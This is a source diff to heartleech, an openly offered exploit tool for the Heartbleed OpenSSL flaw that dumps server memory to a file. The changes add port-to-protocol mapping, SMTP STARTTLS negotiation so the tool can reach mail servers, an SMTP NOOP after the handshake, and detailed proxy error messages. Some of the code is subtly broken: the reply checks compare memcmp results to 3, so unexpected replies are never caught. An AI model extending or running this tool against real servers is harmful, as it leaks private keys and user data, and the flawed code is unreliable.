@@ -146,6 +146,7 @@ enum {
     APP_NONE,
     APP_FTP,
     APP_SMTP,
+    APP_HTTP,
     APP_POP3,
     APP_IMAP4,
     APP_LDAP,
@@ -160,21 +161,37 @@ enum {
  */
 struct Applications {
     unsigned port;
-    int type;
-} default_handshakes[] = {
-    {  21, APP_FTP},
-    {  25, APP_SMTP},
-    { 110, APP_POP3},
-    { 143, APP_IMAP4},
-    { 389, APP_LDAP},
-    { 433, APP_NNTP},
-    { 587, APP_SMTP},
-    { 674, APP_ACAP},
-    {5222, APP_XMPP}, /* http://xmpp.org/extensions/xep-0035.html */
-    {5269, APP_XMPP}, /* http://xmpp.org/extensions/xep-0035.html */
-    {5432, APP_POSTGRES},
-    {0,0}
+    unsigned is_starttls;
+    unsigned type;
+} default_protos[] = {
+    {  21, 1, APP_FTP},
+    {  25, 1, APP_SMTP},
+    {  80, 1, APP_HTTP},
+    { 110, 1, APP_POP3},
+    { 143, 1, APP_IMAP4},
+    { 389, 1, APP_LDAP},
+    { 433, 1, APP_NNTP},
+    { 443, 0, APP_HTTP},
+    { 587, 1, APP_SMTP},
+    { 674, 1, APP_ACAP},
+    {5222, 1, APP_XMPP}, /* http://xmpp.org/extensions/xep-0035.html */
+    {5269, 1, APP_XMPP}, /* http://xmpp.org/extensions/xep-0035.html */
+    {5432, 1, APP_POSTGRES},
+    {0,0,0}
 };
+
+unsigned
+port_to_app(unsigned port, unsigned *is_starttls)
+{
+    unsigned i;
+    for (i=0; default_protos[i].type; i++) {
+        if (default_protos[i].port == port) {
+            *is_starttls = default_protos[i].is_starttls;
+            return default_protos[i].type;
+        }
+    }
+    return 0;
+}
 
 
 /**
@@ -211,6 +228,9 @@ struct DumpArgs {
     unsigned is_scan:1;
     FILE *fp;
     struct Target target;
+    unsigned application;
+    unsigned is_starttls;
+    unsigned starttls;
     char *cert_filename;
     char *dump_filename;
     char *offline_filename;
@@ -867,8 +887,19 @@ proxy_handshake(int fd,
         ERROR_MSG("[-] proxied connect: corrupted result\n");
         return -1;
     }
-    if (foo[1] != 0) {
-        ERROR_MSG("[-] proxied connect: proxy error %u\n", foo[1]);
+    if (foo[1]) {
+        switch (foo[1]) {
+        case 0: break;
+        case 1: ERROR_MSG("[-] proxy error: general failure\n"); break;
+        case 2: ERROR_MSG("[-] proxy error: firewalled\n"); break;
+        case 3: ERROR_MSG("[-] proxy error: net unreachable\n"); break;
+        case 4: ERROR_MSG("[-] proxy error: host unreachable\n"); break;
+        case 5: ERROR_MSG("[-] proxy error: connection refused\n"); break;
+        case 6: ERROR_MSG("[-] proxy error: TTL expired\n"); break;
+        case 7: ERROR_MSG("[-] proxy error: command not supported\n"); break;
+        case 8: ERROR_MSG("[-] proxy error: IPv6 not supported\n"); break;
+        default: ERROR_MSG("[-] proxy error: unknown error\n"); break;
+        }
         return -1;
     }
 
@@ -876,6 +907,8 @@ proxy_handshake(int fd,
     case 1: 
         if (x != 10) {
             ERROR_MSG("[-] proxy returned unexpected data\n");
+            ERROR_MSG("[-] %02x:%02x:%02x:%02x:%02x\n",
+                foo[0], foo[1], foo[2], foo[3], foo[4]);
             return -1;
         } else {
             struct sockaddr_in sin;
@@ -889,6 +922,8 @@ proxy_handshake(int fd,
     case 4:
         if (x != 22) {
             ERROR_MSG("[-] proxy returned unexpected data\n");
+            ERROR_MSG("[-] %02x:%02x:%02x:%02x:%02x\n",
+                foo[0], foo[1], foo[2], foo[3], foo[4]);
             return -1;
         } else {
             struct sockaddr_in6 sin6;
@@ -902,6 +937,8 @@ proxy_handshake(int fd,
     case 3:
         if (x < 7 || x != 7 + foo[4]) {
             ERROR_MSG("[-] proxy returned unexpected data\n");
+            ERROR_MSG("[-] %02x:%02x:%02x:%02x:%02x\n",
+                foo[0], foo[1], foo[2], foo[3], foo[4]);
             return -1;
         } else {
             memcpy(proxy_address, foo+5, foo[4]);
@@ -909,6 +946,8 @@ proxy_handshake(int fd,
         }
     default:
         ERROR_MSG("[-] proxy returned unexpected data\n");
+            ERROR_MSG("[-] %02x:%02x:%02x:%02x:%02x\n",
+                foo[0], foo[1], foo[2], foo[3], foo[4]);
         return -1;
     }
 
@@ -916,6 +955,126 @@ proxy_handshake(int fd,
                                                     proxy_address, proxy_port);
     return 0;
 }
+
+
+/******************************************************************************
+ ******************************************************************************/
+static int
+recv_line(  int fd, 
+            unsigned char *line, unsigned *offset, unsigned max, 
+            unsigned timeout)
+{
+    time_t start_time = time(0);
+    size_t len;
+
+    for (;;) {
+        char c;
+
+        /* wait for incoming data */
+        while (!is_incoming_data(fd)) {
+            if (start_time + timeout < time(0)) {
+                ERROR_MSG("[-] starttls handshake: timed out\n");
+                return -1;
+            }
+        }
+
+        /* grab the next character */
+        len = recv(fd, &c, 1, 0);
+        if (len == 0) {
+            if (start_time + timeout < time(0)) {
+                ERROR_MSG("[-] starttls handshake: network error\n");
+                return -1;
+            }
+        }
+
+        /* append to the line */
+        if (*offset < max) {
+            line[(*offset)++] = c;
+        }
+
+        /* quit at end of line */
+        if (c == '\n')
+            break;
+    }
+
+    return 0;
+}
+
+/******************************************************************************
+ ******************************************************************************/
+static int
+starttls_smtp(int fd, 
+                const struct DumpArgs *args, const struct Target *target)
+{
+    unsigned char line[2048];
+    unsigned offset;
+    char proxy_address[300] = "";
+    unsigned proxy_port = 0;
+    int x;
+
+
+    /* grab the helo line */
+    for (;;) {
+        offset = 0;
+        x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
+        if (x < 0)
+            return x;
+        DEBUG_MSG("[+] %.*s", offset, line);
+        if (offset < 4 || memcmp(line, "220", 3) == 3) {
+            ERROR_MSG("[-] starttls handshake: unexpected data\n");
+            return -1;
+        }
+        if (line[3] != '-')
+            break;
+    }
+
+    /* send greetings */
+    if (send(fd, "EHLO server\r\n", 13, 0) != 13) {
+        ERROR_MSG("[-] starttls handshake: network error\n");
+        return -1;
+    }
+
+    /* grab their response */
+    for (;;) {
+        offset = 0;
+        x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
+        if (x < 0)
+            return x;
+        DEBUG_MSG("[+] %.*s", offset, line);
+        if (offset < 4 || memcmp(line, "250", 3) == 3) {
+            ERROR_MSG("[-] starttls handshake: unexpected data\n");
+            return -1;
+        }
+        if (line[3] != '-')
+            break;
+    }
+
+
+    /* send STARTTLS */
+    if (send(fd, "STARTTLS\r\n", 10, 0) != 10) {
+        ERROR_MSG("[-] starttls handshake: network error\n");
+        return -1;
+    }
+
+    /* see if it succeeded */
+    offset = 0;
+    for (;;) {
+        x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
+        if (x < 0)
+            return x;
+        DEBUG_MSG("[+] %.*s", offset, line);
+        if (offset < 4 || memcmp(line, "220", 3) == 3) {
+            ERROR_MSG("[-] starttls handshake: unexpected data\n");
+            return -1;
+        }
+        if (line[3] != '-')
+            break;
+    }
+
+    DEBUG_MSG("[+] SMTP STARTTLS engaged\n");
+    return 0;
+}
+
 
 
 /******************************************************************************
@@ -1025,6 +1184,29 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
                 target->loop.desired = 0;
             goto end;
         }
+    }
+    
+    
+    /*
+     * If doing STARTTLS, do the negotiation now.
+     */
+    if (args->is_starttls)
+    switch (args->starttls) {
+    case APP_NONE:
+        break;
+    case APP_SMTP:
+        if (starttls_smtp(fd, args, target) == -1) {
+            ERROR_MSG("[-] starttls handshake failed\n");
+            if (target->loop.done == 0)
+                target->loop.desired = 0;
+            goto end;
+        }
+        break;
+    default:
+        ERROR_MSG("[-] starttls handshake: unknown\n");
+        if (target->loop.done == 0)
+            target->loop.desired = 0;
+        goto end;
     }
     
     
@@ -1188,17 +1370,25 @@ again:
      *  layer, or it could be a an application layer request, such as an
      *  HTTP GET or SMTP NOOP command.
      */
-    if (args->proto.http_request) {
+    switch (args->application) {
+    case APP_HTTP:
         ssl3_write_bytes(ssl, 
                          SSL3_RT_APPLICATION_DATA, 
                          args->proto.http_request, 
                          (int)strlen(args->proto.http_request));
-    } else {
+        break;
+    case APP_SMTP:
+        ssl3_write_bytes(ssl, 
+                         SSL3_RT_APPLICATION_DATA, 
+                         "NOOP\r\n",
+                         6);
+        break;
+    default:
         /*ssl3_write_bytes(ssl, 
                          SSL3_RT_ALERT, 
                          "\x15\x03\x02\x00\x02\x01\x2e",
                          7);*/
-        
+        break;
     }
     
     /*
@@ -1704,7 +1894,7 @@ main(int argc, char *argv[])
     args.cfg_loopcount = 1000000;
     args.timeout = 6;
 
-    fprintf(stderr, "\n--- heartleech/1.0.0c ---\n");
+    fprintf(stderr, "\n--- heartleech/1.0.0d ---\n");
     fprintf(stderr, "from https://github.com/robertdavidgraham/heartleech\n");
 
     /*
@@ -1713,13 +1903,11 @@ main(int argc, char *argv[])
     if (argc <= 1 ) {
     usage:
         printf("\n");
-        printf("usage:\n heartleech <hostname> -f<filename> [-l<loops>]"
-               " [-p<port>] [-v<IPver>]  ...\n");
+        printf("usage:\n heartleech <hostname> -f<filename>"
+               " [-p<port>] ...\n");
         printf(" <hostname> is a DNS name or IP address of the target\n");
         printf(" <filename> is where the heartbleed information is stored\n");
-        printf(" <loops> for grabbing more than one bleed\n");
         printf(" <port> is the port number, defaulting to 443\n");
-        printf(" <IPver> is the IP version (4 or 6)\n");
         return 1;
     }
 
@@ -1789,6 +1977,12 @@ main(int argc, char *argv[])
                 exit(1);
             }
             args.target.loop.desired = args.cfg_loopcount;
+
+            args.application = port_to_app(args.target.port, &args.is_starttls);
+            if (args.is_starttls)
+                args.starttls = args.application;
+            initialize_protocols(&args, &args.target);
+
             
             /*
              * Now run the thread
